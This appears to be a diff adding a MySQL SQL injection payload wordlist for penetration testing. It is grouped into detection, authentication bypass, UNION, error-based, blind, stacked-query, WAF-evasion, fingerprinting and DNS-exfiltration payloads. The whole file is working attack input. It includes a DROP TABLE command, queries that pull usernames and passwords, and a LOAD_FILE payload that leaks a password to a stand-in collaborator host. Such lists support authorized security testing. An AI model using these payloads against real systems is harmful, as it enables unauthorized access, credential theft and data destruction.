@@ -1,0 +1,76 @@
+# MySQL SQLi — SOTA curated + PortSwigger cheat sheet patterns
+# Full wordlists: sqli/union-select.txt, sqli/error-based.txt, sqli/time-based.txt (PAT sync)
+
+# === Detection ===
+'
+"
+'
+"
+` 
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+') OR ('1'='1
+1' ORDER BY 1--
+1' ORDER BY 10--
+1' ORDER BY 100--
+
+# === Auth bypass ===
+administrator'--
+admin' OR '1'='1'--
+' OR 1=1#
+' OR 1=1 LIMIT 1;#
+' OR 'x'='x
+') OR ('x'='x
+admin'/*
+' or 1=1#
+" or 1=1#
+or 1=1--
+' or '1'='1'--
+
+# === UNION (adjust column count with ORDER BY first) ===
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+' UNION ALL SELECT NULL,NULL,@@version--
+
+# === Error-based ===
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
+
+# === Boolean blind ===
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(@@version,1,1)='5'--
+
+# === Time blind ===
+' OR SLEEP(5)--
+' OR IF(1=1,SLEEP(5),0)--
+1' AND SLEEP(5) AND '1'='1
+' OR BENCHMARK(5000000,MD5('A'))--
+
+# === Stacked (PHP mysqli_multi_query) ===
+'; SELECT SLEEP(5)--
+'; DROP TABLE users;--
+
+# === WAF bypass ===
+'/**/OR/**/1=1--
+'%0AOR%0A1=1--
+' OR 1=1%23
+' UnIoN SeLeCt 1,2,3--
+' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
+
+# === OAST DNS exfil (Collaborator) ===
+' AND LOAD_FILE(CONCAT('\\\\','COLLAB.subdomain','\\a'))--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.COLLAB.subdomain\\a'))--
+
+# === Fingerprint ===
+' UNION SELECT @@version,NULL--
+' UNION SELECT user(),database()--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
